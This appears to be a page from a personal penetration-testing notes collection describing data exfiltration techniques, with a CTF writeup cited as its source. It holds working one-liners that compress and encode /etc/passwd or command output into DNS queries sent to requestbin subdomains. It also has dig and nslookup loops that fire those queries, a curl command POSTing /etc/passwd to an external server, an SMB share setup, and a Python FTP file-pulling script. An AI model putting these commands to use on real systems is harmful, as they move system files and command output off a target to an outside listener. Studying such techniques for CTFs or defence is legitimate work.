# Data Exfiltration

## DNS Exfiltration

When outbound rules from a target are restrictive, it may still be possible to exfiltrate data via DNS. The awesome site [requestbin.net](requestbin.net) has support for [receiving DNS queries](http://requestbin.net/dns), too. By encoding the data-to-exfil within the subdomain field of a domain we control (through a service like requestbin), we can send pretty much data back to ourselves. requestbin alternatives include:

* [DNSBin](http://dnsbin.zhack.ca)

These concepts are based on [this writeup from Insomnihack Teaser 2020](https://ctftime.org/writeup/17998). I present below a proof-of-concept DNS exfiltration protocol with the following fields:

* N-byte 0-indexed sequence number
* 2-byte session
* N-byte data field
* The remainer of the requestbin domain (something like `.bf6c4b6d8f1b164d5c4d.d.requestbin.net`)

Some restrictions are inherited from the DNS specification:

* Each label (i.e., `www` and `company` from `www.company.com`) cannot exceed 63 characters
* The total length of the domain cannot exceed 253 characters

The below one-liners provide mechanisms of generating a `/tmp/resolveme` file that encodes the desired payload into a series of domains that use this basic protocol. The only step that remains after generating this file is to execute the DNS queries that create the exfiltration traffic. Take note that these one-liners also generate the session bytes inline; if space is at a premium, you can do this offline and harcode it in the commands. Another implementation of the below snippets is that they provide a 5-character space for the sequence number; exfils involving larger sequences may have to adjust this logic.

```sh
# Python 2/3 file read with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve from dnsbin.
python -c "s='.%02x'%__import__('random').getrandbits(8);d='.8f85be7ebfc30f73ebe5.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(open('/etc/passwd','rb').read())).decode(),min(63,245-len(s)-len(d))).splitlines())))"

# python 2/3 command exec with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve from dnsbin.
python3 -c "s='.%02x'%__import__('random').getrandbits(8);d='.e004d291fe96f8880232.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(__import__('subprocess').check_output('ls -la 2>&1',shell=True))).decode(),min(63,245-len(s)-len(d))).splitlines())))"

# Bash file read with compression; use `./python3-dns-bin-retriever -d gzip -t TOKEN` to retrieve from dnsbin.
rm /tmp/resolveme; d='.17ccedcf3f3294a6cbcc.d.requestbin.net';i=0;sess=$(xxd -l 1 -p /dev/urandom); <data.txt gzip -c | xxd -c 31 -p | while read l; do echo $i.$sess.$l$d >> /tmp/resolveme; let i++; done
```

And then sending that data from the target to your dnsbin listener:

```sh
# dig-powered name resolution.
dig -f /tmp/resolveme

# nslookup-powered name resolution
while read d; do nslookup $d; done </tmp/resolveme
```

While data can be manually retrieved and decoded/decompressed from requestbin, it might be useful to setup an automated retriever. See my [dnsbin retriever](../scripts/exfil/python3-dnsbin-retriever.py) script for a ready-to-go solution.

## HTTP File Exfiltration

A convenient method of transferring back to yourself is through HTTP POSTs using an existing HTTP client like `curl`. This can also be paired with a service like [ngrok](https://ngrok.com/) if you just want to transfer files over the public internet.

### Server-side

Using PHP's `-S` standalone server mode, it is pretty simple to accept client file-upload requests. More information about the PHP builtin web server available [here](https://www.php.net/manual/en/features.commandline.webserver.php). You can grab a copy of my POSTed-file-accepting PHP server in the [`scripts/web`](../scripts/web) directory.

### Client-side

The simplest way of uploading files from the client side is to POST them with `curl`:

```sh
curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -F 'f=@/etc/passwd' http://exfil-server.com:8888
```

### Tunnelling Over the Public Internet

Sometimes you can't communicate directly back to your attack machine from the target, but the target *can* touch the public internet. The following services will come in handy for quickly setting up listeners on the public internet:

* [ngrok](https://ngrok.com/): Free service that lets you expose HTTP and TCP ports on your machine on an `*.ngrok.io` domain on the public web. Probably the best option in this list.
* [requestbin](http://requestbin.net/): Free service for receiving HTTP requests. More useful for SSRF or XSS challenges where you do not need to control the application server talking back to the target. This site also provides [dnsbin](http://requestbin.net/dns).

## SMB File Exfiltration

Host files from a Kali workstation with:

```sh
mkdir smb-files
impacket-smbserver -smb2support MySmbTransferShare ./smb-files
```

## FTP File Exfiltration

If you can reach a target that has an FTP server, you probably want those files. In the event you are trying to exfil from a host that does not have a native FTP client, but has Python, the following script provides a solution:

```python
import sys
from ftplib import FTP

HOST = "10.10.10.10"
USER, PASS = "anonymous", "anonymous@"

FILES_TO_EXFIL = [
    "secret-data.txt",
    "another-script.py",
]

ftp = FTP(HOST)
ftp.login(USER, PASS)
ftp.retrlines("LIST")

for f in FILES_TO_EXFIL:
    sys.stdout.write(ftp.retrbinary("RETR " + f, open(f, "wb").write) + "\n")

ftp.quit()
```

You might want to turn this script into a one-line shell command. If so, check out [my one-liner-izing script](../scripts/encoding/any-python-one-liner-ize.py).
